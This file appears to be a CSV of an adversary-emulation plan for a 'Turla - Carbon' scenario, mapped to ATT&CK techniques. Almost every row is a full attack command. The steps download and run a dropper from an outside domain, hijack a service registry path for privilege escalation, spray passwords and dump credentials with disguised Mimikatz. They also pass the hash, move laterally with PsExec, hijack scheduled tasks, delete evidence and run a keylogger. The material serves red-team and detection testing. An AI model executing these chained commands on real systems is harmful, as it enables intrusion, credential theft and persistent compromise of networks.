@@ -1,0 +1,209 @@
+﻿source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
+turla_carbon,turla_carbon,Turla - Carbon,unknown,1,9a49d734-c69a-4a6b-b726-5a2a86edf418,x,x,x,x,RDP to 1st host (User),"Use xfreerdp to RDP into the first host. Then, wait for the login to complete.","exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore"
+turla_carbon,turla_carbon,Turla - Carbon,1,2,2c7ad0e1-d112-4c71-8deb-38bc3ce5654b,1.A.1,Initial Access,T1566.002,Phishing: Spearphishing Link,Download EPIC dropper (User),"Using xdotool, send keystrokes to download the EPIC dropper.","rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6; xdotool type --window ""$r...","rdp_pid=$(pgrep -f xfreerdp);
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""run"";
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""microsoft-edge"";
+xdotool key --window ""$rdp_window"" shift+colon; 
+xdotool type --window ""$rdp_window"" ""http"";
+xdotool key --window ""$rdp_window"" shift+colon; 
+xdotool type --window ""$rdp_window"" ""//anto-int.com/"";
+xdotool key --window ""$rdp_window"" shift+N; 
+xdotool key --window ""$rdp_window"" shift+T; 
+xdotool key --window ""$rdp_window"" shift+F; 
+xdotool key --window ""$rdp_window"" shift+V; 
+xdotool type --window ""$rdp_window"" ""ersion.exe"";
+xdotool key --window ""$rdp_window"" Return;
+sleep 20;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Tab; sleep 1;
+xdotool key --window ""$rdp_window"" Return;"
+turla_carbon,turla_carbon,Turla - Carbon,1,3,bb4dd7c0-c5df-4321-94ca-cb7da59b9c32,1.A.2,Execution,T1204.002,User Execution: Malicious File,Run EPIC dropper (User),"Using xdotool, run the EPIC droppper.","rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6; xdotool type --window ""$r...","rdp_pid=$(pgrep -f xfreerdp);
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""run"";
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 6;
+xdotool type --window ""$rdp_window"" 'C';
+xdotool key --window ""$rdp_window"" shift+colon;           
+xdotool type --window ""$rdp_window"" '\Users\#{first.target.user}\Downloads\';
+xdotool key --window ""$rdp_window"" shift+N; 
+xdotool key --window ""$rdp_window"" shift+T; 
+xdotool key --window ""$rdp_window"" shift+F; 
+xdotool key --window ""$rdp_window"" shift+V; 
+xdotool type --window ""$rdp_window"" ""ersion"";
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 6;
+xdotool key --window ""$rdp_window"" R;
+sleep 30;"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,4,c4e2f189-ef8d-4073-abfb-1d3449af464b,x,x,x,x,Log out of the 1st target host (User),Use xdotool to send keystrokes to log out of the 1st target host.,"rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); echo $rdp_window; sleep 5; xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Alt+Delete; sle...","rdp_pid=$(pgrep -f xfreerdp);
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+echo $rdp_window;
+sleep 5; 
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+xdotool key --window ""$rdp_window"" Ctrl+Alt+Delete;
+sleep 6;
+xdotool key --window ""$rdp_window"" Down;
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 30;"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,5,771a00b3-2b39-436d-b003-b58cacffa774,x,x,x,x,Log back in to the 1st target host (User),Use xfreerdp to log back in to the 1st target host. Wait for login to complete.,"exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{first.target.user}"" /p:""#{first.target.password}"" /v:#{first.target.ip} /cert-ignore"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,6,3e20bbc1-b60a-4129-88b5-627b7b4ac17d,x,x,x,x,Open Edge to trigger 1st EPIC beacon (User),"Use xdotool to open Microsoft Edge and open a blank page. Then, wait to receive the new implant beacon.","rdp_pid=$(pgrep -f xfreerdp); rdp_window=$(xdotool search --pid ""$rdp_pid""); echo $rdp_window; sleep 5; xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6...","rdp_pid=$(pgrep -f xfreerdp);
+rdp_window=$(xdotool search --pid ""$rdp_pid"");
+echo $rdp_window;
+sleep 5; 
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""run"";
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""microsoft-edge"";
+xdotool key --window ""$rdp_window"" shift+colon;
+xdotool key --window ""$rdp_window"" Return;
+sleep 180;"
+turla_carbon,turla_carbon,Turla - Carbon,3,7,eb66d327-3f82-4433-8897-76cd8a46865b,3.A.1-2,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,Execute net group discovery commands and execute `tasklist /svc` (Adversary),Execute net group discovery commands and execute `tasklist /svc`,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group ""Domain Admins"" /domain && net group ""Domain Computers"" /domain && net group ""Domain Controllers"" /domain && tasklist /svc' --task-wait-time...","./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group ""Domain Admins"" /domain && net group ""Domain Computers"" /domain && net group ""Domain Controllers"" /domain && tasklist /svc' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,3,8,88bb16c5-f78b-45c3-91b6-a7422cd2fb13,3.A.5-6,Execution,T1059.001,Command and Scripting Interpreter: Powershell,Reg query the ViperVPNSvc Service & verify which users can access it (Adversary),Reg query the ViperVPNSvc Service & verify which users can access it,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell ""$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Acces...","./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell ""$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access""' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,3,9,d5e29782-72ca-45f0-b286-09525ae91d75,3.A.7,Privilege Escalation,T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,Modify the ViperVPN service registry key (Adversary),Modify the ViperVPN service registry key,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add ""HKLM\system\currentcontrolset\services\ViperVPNSvc"" /t REG_EXPAND_SZ /v ImagePath /d ""cmd.exe /c %TEMP%\mxs_installer.exe"" /f' --task-wait-ti...","./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | reg add ""HKLM\system\currentcontrolset\services\ViperVPNSvc"" /t REG_EXPAND_SZ /v ImagePath /d ""cmd.exe /c %TEMP%\mxs_installer.exe"" /f' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,10,349d3879-c849-493a-989e-6d7f40015f54,x,x,x,x,RDP to 2nd host (User),"Use xfreerdp to RDP into the second host. Then, wait for the login to complete.","exec-background xfreerdp /u:""#{network.domain.name}\\#{second.target.user}"" /p:""#{second.target.password}"" /v:#{second.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{second.target.user}"" /p:""#{second.target.password}"" /v:#{second.target.ip} /cert-ignore"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,11,b7190a39-c5f1-4955-8923-44807d8069e7,x,x,x,x,Stop and start ViperVPNSvc Service (User),"Use xdotool to open an administrator powershell prompt on the second host. Use the administrator powershell prompt to start the ViperVPNSvc Service on the second host. Then, wait for the implant beacon.","rdp_pid=$(pgrep -f #{second.target.user}); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 1; xdotool type...","rdp_pid=$(pgrep -f #{second.target.user});
+rdp_window=$(xdotool search --pid ""$rdp_pid""); 
+
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 1;
+xdotool type --window ""$rdp_window"" ""powershell"";
+sleep 1;
+xdotool key --window ""$rdp_window"" Shift+F10;
+sleep 1;
+xdotool key --window ""$rdp_window"" Down;
+sleep 1;
+xdotool key --window ""$rdp_window"" Return;
+sleep 1;
+xdotool key --window ""$rdp_window"" alt+Y;  
+sleep 2;
+xdotool type --window ""$rdp_window"" ""sc.exe \\\\#{first.target.host} stop ViperVPNSvc; sc.exe \\\\#{first.target.host} start ViperVPNSvc;"";
+sleep 2;
+xdotool key --window ""$rdp_window"" Return;
+sleep 250;"
+turla_carbon,turla_carbon,Turla - Carbon,4,12,da986326-8d71-4e85-b767-0c8ffc49a2af,4.A.1,Command and Control,T1105,Ingress Tool Transfer,Download the CARBON-DLL installer (Adversary),Task the SYSTEM level EPIC implant to download the CARBON-DLL installer.,./evalsC2client.py --set-and-complete-task #{second.epic.id} 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe' --task-wait-timeout 60,./evalsC2client.py --set-and-complete-task #{second.epic.id} 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe' --task-wait-timeout 60
+turla_carbon,turla_carbon,Turla - Carbon,4,13,d702d810-3414-4e38-8cbc-22fc429d2da4,4.A.2-4.A.6,Defense Evasion,T1112,Modify Registry,Execute the CARBON-DLL installer (Adversary),Task the SYSTEM level EPIC implant to execute the CARBON-DLL installer.,./evalsC2client.py --set-and-complete-task #{second.epic.id} 'exe | C:\Windows\System32\WinResSvc.exe' --task-wait-timeout 60; sleep 180;,"./evalsC2client.py --set-and-complete-task #{second.epic.id} 'exe | C:\Windows\System32\WinResSvc.exe' --task-wait-timeout 60; 
+sleep 180;"
+turla_carbon,turla_carbon,Turla - Carbon,4,14,f2462df4-2867-4d72-b3f1-ffa9a7431f87,4.A.13,Discovery,T1033,System Owner/User Discovery,Perform whoami discovery command (Adversary),Task the Carbon implant to execute the whoami discovery command.,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 0, ""cmd"": ""whoami""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 0, ""cmd"": ""whoami""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,15,02772b8f-4f3b-42c6-9705-1d05b33ad19a,x,x,x,x,Open Microsoft Edge on 2nd target host (User),Use xdotool to run Microsoft Edge and open a blank page.,"rdp_pid=$(pgrep -f #{second.target.user}); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 6; xdotool type --window ""$rdp_window"" ""run""; sleep 6; xdotool key --wind...","rdp_pid=$(pgrep -f #{second.target.user});
+rdp_window=$(xdotool search --pid ""$rdp_pid""); 
+
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""run"";
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""microsoft-edge"";
+xdotool key --window ""$rdp_window"" shift+colon;
+xdotool key --window ""$rdp_window"" Return;"
+turla_carbon,turla_carbon,Turla - Carbon,5,16,99748bd2-530e-47b6-b6d7-576d4f573b6d,5.A.2-3,Credential Access,T1110.003,Brute Force: Password Spraying,Password Spray (Adversary),Task CARBON-DLL to download and execute the batch script to spray weak passwords against the domain admin accounts and attempt to mount the C$ drive of the DC.,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 1, ""payload"": ""password_spray.bat"", ""payload_dest"": ""C:\\Windows\\Temp\\winsas64.bat"", ""cmd"": ""C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeo...","./evalsC2client.py --set-and-complete-task #{first.carbon.id}  '{""id"": 1, ""payload"": ""password_spray.bat"", ""payload_dest"": ""C:\\Windows\\Temp\\winsas64.bat"", ""cmd"": ""C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeout 300 | grep 'SUCCESS'"
+turla_carbon,turla_carbon,Turla - Carbon,5,17,4945a1e5-75ab-4665-8441-6995105edf38,5.A.4,Defense Evasion,T1070.004,Indicator Removal on Host: File Deletion,Remove password spray script (Adversary),Task CARBON-DLL to remove the password spray script,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 2, ""cmd"": ""del /Q C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{first.carbon.id}  '{""id"": 2, ""cmd"": ""del /Q C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,5,18,386b614d-7237-4d1a-a6dd-543f6f515bd4,5.A.5-6,Lateral Movement,T1570,Lateral Tool Transfer,Download second CARBON-DLL (Adversary),Task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the System32 folder on the DC via the mounted drive.,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 3, ""payload"": ""carbon_installer_2.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\wmimetricsq.exe"", ""cmd"": ""move C:\\Windows\\Temp\\wmimetricsq.exe \\\\#...","./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 3, ""payload"": ""carbon_installer_2.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\wmimetricsq.exe"", ""cmd"": ""move C:\\Windows\\Temp\\wmimetricsq.exe \\\\#{second.target.host}\\C$\\Windows\\System32""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,5,19,954ee411-8443-41f9-9a0c-f8ac032b68e7,5.A.7,Execution,T1053.005,Scheduled Task/Job: Scheduled Task,Enumerate remote scheduled tasks (Adversary),"Task CARBON-DLL to enumerate remote scheduled tasks on the domain controller, using the discovered password for the domain admin","./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 4, ""cmd"": ""schtasks /query /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password}""}' --task-wait-ti...","./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 4, ""cmd"": ""schtasks /query /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password}""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,5,20,c90bbb6c-f9bd-4811-b7b7-c923902a8bde,5.A.7,Persistence,T1053.005,Scheduled Task/Job: Scheduled Task,Modify remote scheduled task (Adversary),Task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain admin,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 5, ""cmd"": ""schtasks /Change /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \""\\Microsof...","./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 5, ""cmd"": ""schtasks /Change /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \""\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"" /TR %SystemRoot%\\System32\\wmimetricsq.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,5,21,a2621060-73a5-461b-918d-88a86f83c21b,5.A.7,Privilege Escalation,T1053.005,Scheduled Task/Job: Scheduled Task,Execute modified scheduled task (Adversary),Task CARBON-DLL to remotely start the modified scheduled task on the domain controller,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 6, ""cmd"": ""schtasks /Run /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \""\\Microsoft\\...","./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 6, ""cmd"": ""schtasks /Run /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \""\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"" /I""}' --task-wait-timeout 300; 
+sleep 180;"
+turla_carbon,turla_carbon,Turla - Carbon,5,22,bf90a64c-5367-4de6-93b5-a718189803c3,5.A.9,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,Discovery on domain controller (Adversary),Task the new CARBON-DLL implant with discovery commands to be run on the domain controller.,"output=$(./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 0, ""cmd"": ""net group /domain""}' --task-wait-timeout 60); echo $output | grep 'Web Servers' -i && echo $output | grep 'Web Server Admins' -i;","output=$(./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 0, ""cmd"": ""net group /domain""}' --task-wait-timeout 60);
+echo $output | grep 'Web Servers' -i && echo $output | grep 'Web Server Admins' -i;"
+turla_carbon,turla_carbon,Turla - Carbon,5,23,4e39b630-f2d7-405e-a4ef-d11cf79db1be,5.A.9,Discovery,T1069.002,Permission Groups Discovery: Domain Groups,Enumerate groups (Adversary),Task CARBON-DLL to enumerate both groups for their members,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 1, ""cmd"": ""net group \""Web Servers\"" /domain && net group \""Web Server Admins\"" /domain""}' --task-wait-timeout 60;","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 1, ""cmd"": ""net group \""Web Servers\"" /domain && net group \""Web Server Admins\"" /domain""}' --task-wait-timeout 60;"
+turla_carbon,turla_carbon,Turla - Carbon,5,24,4e31798e-f973-4480-aa38-3372c44c29c9,5.A.10,Discovery,T1018,Remote System Discovery,Enumerate Active Directory Computers (Adversary),Task CARBON-DLL to enumerate the Active Directory Computers,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 2, ""cmd"": ""dsquery * -filter \""(&(objectclass=computer))\"" -attr *""}' --task-wait-timeout 60 | grep -i '#{third.target.user} Workstation'","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 2, ""cmd"": ""dsquery * -filter \""(&(objectclass=computer))\"" -attr *""}' --task-wait-timeout 60 | grep -i '#{third.target.user} Workstation'"
+turla_carbon,turla_carbon,Turla - Carbon,6,25,33d4136a-d5e6-45f2-b0e1-786d3ec8bf02,6.A.1-3,Credential Access,T1003,OS Credential Dumping,Mimikatz lsadump (Adversary),Task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 3, ""payload"": ""DvKGMmGn.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\terabox.exe"", ""cmd"": ""move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\...","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 3, ""payload"": ""DvKGMmGn.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\terabox.exe"", ""cmd"": ""move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe && C:\\Windows\\System32\\terabox.exe \""lsdu::go /ynot\"" \""quit\""""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,26,9b50feb8-41a2-489a-a863-75240743734c,x,x,x,x,RDP to 3rd host (User),"Use xfreerdp to RDP into the third host. Then, wait for the login to complete.","exec-background xfreerdp /u:""#{network.domain.name}\\#{third.target.user}"" /p:""#{third.target.password}"" /v:#{third.target.ip} /cert-ignore","exec-background xfreerdp /u:""#{network.domain.name}\\#{third.target.user}"" /p:""#{third.target.password}"" /v:#{third.target.ip} /cert-ignore"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,27,f6690cfd-073d-49c4-bd1b-1194aeb26780,x,x,x,x,Open Microsoft Edge (User),Use xdotool to run Microsoft Edge and open a blank page.,"rdp_pid=$(pgrep -f #{third.target.user}); rdp_window=$(xdotool search --pid ""$rdp_pid""); sleep 6; xdotool mousemove --window ""$rdp_window"" 100 100 click 1; sleep 6; xdotool key --window ""$rdp_window"" Ctrl+Escape; slee...","rdp_pid=$(pgrep -f #{third.target.user});
+rdp_window=$(xdotool search --pid ""$rdp_pid""); 
+sleep 6;
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+sleep 6;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""run"";
+sleep 6;
+xdotool key --window ""$rdp_window"" Return;
+sleep 6;
+xdotool type --window ""$rdp_window"" ""microsoft-edge"";
+xdotool key --window ""$rdp_window"" shift+colon;
+xdotool key --window ""$rdp_window"" Return;"
+turla_carbon,turla_carbon,Turla - Carbon,7,28,f9ad6b77-518e-4784-9fba-5e4cd97fc455,7.A.1,Command and Control,T1105,Ingress tool transfer,Download PsExec (Adversary),Task the CARBON-DLL implant on the domain controller to download PsExec.,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 4, ""payload"": ""PsExec.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp5712.tmp"", ""cmd"": ""move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\w...","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 4, ""payload"": ""PsExec.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp5712.tmp"", ""cmd"": ""move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe && dir C:\\Windows\\System32\\wsqsp.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,7,29,75424a6a-28f5-46fa-834b-508f7d09020a,7.A.2,Command and Control,T1105,Ingress tool transfer,Download third CARBON-DLL (Adversary),Task the CARBON-DLL implant on the domain controller to download a third copy of the CARBON-DLL installer.,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 5, ""payload"": ""carbon_installer_3.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp1283.tmp"", ""cmd"": ""move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\...","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 5, ""payload"": ""carbon_installer_3.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp1283.tmp"", ""cmd"": ""move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe && dir C:\\Windows\\System32\\wsqmanager.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,7,30,824d5eda-7743-4c10-89d8-143d4bc50eda,7.A.3,Lateral Movement,T1550.002,Use Alternate Authentication Material: Pass the Hash,Copy installer & execute using PsExec (Adversary),Task the CARBON-DLL implant on the domain controller to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the installer to Adalwolfa's workstation and (2) execute it using PsExec.,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 6, ""cmd"": ""C:\\Windows\\System32\\terabox.exe \""pr::d\"" \""slsa::htp /user:#{third.target.user} /domain:#{network.domain.name} /ntlm:#{third.target...","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 6, ""cmd"": ""C:\\Windows\\System32\\terabox.exe \""pr::d\"" \""slsa::htp /user:#{third.target.user} /domain:#{network.domain.name} /ntlm:#{third.target.ntlm} /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\"" \""quit\""""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,31,e7c827d6-57f8-40d0-b3a9-e03b2e4d0484,T1070.004,Defense Evasion,7.A.5,Indicator Removal on Host: File Deletion,Clean dropped files (Adversary),Task the CARBON-DLL implant on the domain controller to clean up dropped files.,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 7, ""cmd"": ""del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 7, ""cmd"": ""del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,32,1a9e352f-4edb-480d-b29c-66acb6c4df19,T1056.001,Collection,8.A.2,Input Capture: Keylogging,Download and execute keylogger (Adversary),Task the CARBON-DLL on Adalwolfa's workstation to download and execute the keylogger binary in the background.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 0, ""payload"": ""keylogger.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\wingtsvcupdt.exe"", ""cmd"": ""C:\\Windows\\Temp\\wingtsvcupdt.exe -r""}' --task-wait...","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 0, ""payload"": ""keylogger.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\wingtsvcupdt.exe"", ""cmd"": ""C:\\Windows\\Temp\\wingtsvcupdt.exe -r""}' --task-wait-timeout 60"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,33,4cedd0ef-c802-431d-a4a1-eaf1163543f3,x,x,x,x,Adalwolfa types keylogged data (User),"Xdotools will open powershell on the third target, ssh into the Apache server, type password, and exit ssh session.","rdp_pid=$(pgrep -f #{third.target.user}); rdp_window=$(xdotool search --pid ""$rdp_pid""); xdotool mousemove --window ""$rdp_window"" 100 100 click 1; xdotool key --window ""$rdp_window"" Ctrl+Escape; sleep 5; xdotool type ...","rdp_pid=$(pgrep -f #{third.target.user});
+rdp_window=$(xdotool search --pid ""$rdp_pid""); 
+
+xdotool mousemove --window ""$rdp_window"" 100 100 click 1;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 5;
+xdotool type --window ""$rdp_window"" ""powershell"";
+sleep 5;
+xdotool key --window ""$rdp_window"" Return;
+sleep 5;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+xdotool key --window ""$rdp_window"" Ctrl+Escape;
+sleep 5;
+
+xdotool type --window ""$rdp_window"" 'ssh #{third.target.user}@#{apache.server.ip}';
+sleep 5;
+xdotool key --window ""$rdp_window"" Return;
+sleep 5; 
+xdotool type --window ""$rdp_window"" 'yes';
+sleep 5;
+xdotool key --window ""$rdp_window"" Return;
+sleep 5;
+xdotool key --window ""$rdp_window"" Shift+P;
+xdotool type --window ""$rdp_window"" 'assword2';
+xdotool key --window ""$rdp_window"" Shift+1;
+xdotool key --window ""$rdp_window"" Return;
+xdotool type --window ""$rdp_window"" 'exit';
+xdotool key --window ""$rdp_window"" Return;
+sleep 10;"
+turla_carbon,turla_carbon,Turla - Carbon,unknown,34,cefe85b8-d1e5-4077-afac-81a6622f4c66,T1056.001,Collection,8.A.2,Input Capture: Keylogging,Kill keylogger process (Adversary),Task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process.,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 1, ""cmd"": ""taskkill /IM wingtsvcupdt.exe /F""}' --task-wait-timeout 60","./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 1, ""cmd"": ""taskkill /IM wingtsvcupdt.exe /F""}' --task-wait-timeout 60"
